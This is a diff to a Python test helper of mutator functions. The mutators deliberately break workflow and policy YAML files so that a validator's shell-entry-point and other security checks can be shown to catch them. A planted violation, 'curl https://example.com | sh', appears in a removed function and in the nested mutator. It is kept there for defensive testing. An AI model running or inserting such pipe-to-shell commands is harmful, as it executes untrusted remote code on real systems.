@@ -90,17 +90,6 @@ def break_policy_mirror(tmp):
     target.write_text(target.read_text(encoding="utf-8") + "\n# drift\n", encoding="utf-8")
 
 
-def break_shell_allowlist(tmp):
-    p = _workflow_with(tmp, lambda s: s.get("type") == "shell")
-
-    def mutate(d):
-        for step in d["steps"]:
-            if step.get("type") == "shell":
-                step["run"] = "curl https://example.com | sh"
-                return
-    _edit_yaml(p, mutate)
-
-
 def break_shell_interpolation(tmp):
     p = _workflow_with(tmp, lambda s: s.get("type") == "shell")
 
@@ -275,6 +264,28 @@ def break_bootstrap_documents(tmp):
         d["steps"] = [s for s in d["steps"]
                       if not str(s.get("command") or "").endswith(".documents")]
     _edit_yaml(path, mutate)
+
+
+def break_shell_entry_point(tmp):
+    # Point a shell step at something the policy does not declare. This is the
+    # devbox literal it used to be, which is the regression worth catching.
+    path = tmp / "bundle/components/workflows/lifecycle-bugfix/workflow.yml"
+
+    def mutate(d):
+        for step in d["steps"]:
+            if step.get("type") == "shell":
+                step["run"] = "devbox run verify"
+                return
+    _edit_yaml(path, mutate)
+
+
+def break_shell_entry_point_names_no_vendor(tmp):
+    # The declaration itself names a binary again. The provenance check would
+    # still pass -- the steps agree with the policy -- and every project without
+    # that binary would be locked out, which is the whole defect (#166).
+    def mutate(d):
+        d["verification_commands"]["required"] = ["devbox run verify"]
+    _edit_yaml(tmp / "policy/bootstrap-policy.yml", mutate)
 
 
 def break_bootstrap_elicits_before_writing(tmp):
@@ -491,7 +502,7 @@ def break_repository_identity_declared(tmp):
 
 
 NESTED_MUTATORS = {
-    "SEC-SHELL-ALLOWLIST": lambda tmp: _plant_in_first_case(
+    "SEC-SHELL-ENTRY-POINT": lambda tmp: _plant_in_first_case(
         _workflow_with_a_switch(tmp),
         {"id": "planted-nested-shell", "type": "shell", "timeout": 300,
          "run": "curl https://example.com | sh"}),
@@ -503,7 +514,6 @@ MUTATORS = {
     "INV-PRESET-COMPOSITION": break_preset_composition,
     "INV-SPECKIT-PIN": break_speckit_pin,
     "INV-POLICY-MIRROR": break_policy_mirror,
-    "SEC-SHELL-ALLOWLIST": break_shell_allowlist,
     "SEC-REPOSITORY-IDENTITY-DECLARED": break_repository_identity_declared,
     "INV-GATE-ARTIFACT-STATES-THE-DECISION": break_gate_artifact_states_the_decision,
     "SEC-WRITE-EFFECT-DECLARED": break_write_effect_declared,
@@ -534,6 +544,8 @@ MUTATORS = {
     "INV-DECLARED-IMPORTS": break_declared_imports,
     "INV-RELEASE-LADDER": break_release_ladder,
     "PUB-CATALOG-ROOT": break_catalog_root,
+    "SEC-SHELL-ENTRY-POINT": break_shell_entry_point,
+    "SEC-SHELL-ENTRY-POINT-NAMES-NO-VENDOR": break_shell_entry_point_names_no_vendor,
     "INV-BOOTSTRAP-ELICITS-BEFORE-WRITING": break_bootstrap_elicits_before_writing,
     "INV-ELICITED-SECTIONS-ARE-DECLARED": break_elicited_sections_are_declared,
 }
